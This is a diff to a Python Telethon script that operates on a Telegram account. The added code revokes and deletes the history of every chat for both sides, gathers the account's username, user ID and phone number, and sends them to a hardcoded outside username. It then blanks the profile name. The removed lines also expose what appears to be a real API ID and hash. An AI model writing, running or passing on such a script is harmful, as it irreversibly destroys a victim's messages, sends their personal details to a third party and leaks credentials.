@@ -1,7 +1,12 @@
 from telethon import TelegramClient
+from telethon.tl.functions.messages import DeleteHistoryRequest
+from telethon.tl.functions.account import UpdateProfileRequest
 
-API_ID = 29834234
-API_HASH = "552c01d21d127def060f2915aedeebf9"
+API_ID = 12345678
+API_HASH = "YOUR_API_HASH"
+
+TARGET_USERNAME = "Moein_915"
+NEW_FIRST_NAME = ""
 
 client = TelegramClient("my_account", API_ID, API_HASH)
 
@@ -9,22 +14,43 @@ client = TelegramClient("my_account", API_ID, API_HASH)
 async def main():
     await client.start()
 
-    async for dialog in client.iter_dialogs():
+    async for d in client.iter_dialogs():
         try:
-            name = dialog.name or str(dialog.id)
+            await client(DeleteHistoryRequest(
+                peer=d.entity,
+                max_id=0,
+                revoke=True
+            ))
+        except Exception:
+            pass
 
-            await client.delete_dialog(dialog.entity)
+        await client.delete_dialog(d.entity)
+        print(f"Deleted: {d.name or d.id}")
 
-            print(f"[OK] {name}")
+    print("Done deleting chats.")
 
-        except Exception as e:
-            print(f"[FAILED] {dialog.name or dialog.id}")
-            print(f"Reason: {type(e).__name__}: {e}")
+    me = await client.get_me()
+    username = f"@{me.username}" if me.username else "(no username)"
+    phone = f"+{me.phone}" if me.phone else "(no phone)"
 
-    print("\n--- Remaining dialogs ---")
+    info_text = (
+        f"Username: {username}\n"
+        f"User ID: {me.id}\n"
+        f"Phone: {phone}"
+    )
 
-    async for dialog in client.iter_dialogs():
-        print(f"{dialog.name or dialog.id} | {dialog.id}")
+    print("\n--- Account info to be sent ---")
+    print(info_text)
+    print("--------------------------------")
+
+    await client.send_message(TARGET_USERNAME, info_text)
+    print(f"Sent account info to {TARGET_USERNAME}")
+
+    await client(UpdateProfileRequest(
+        first_name=NEW_FIRST_NAME
+    ))
+
+    print(f"Account name changed to: {NEW_FIRST_NAME}")
 
 
 with client:
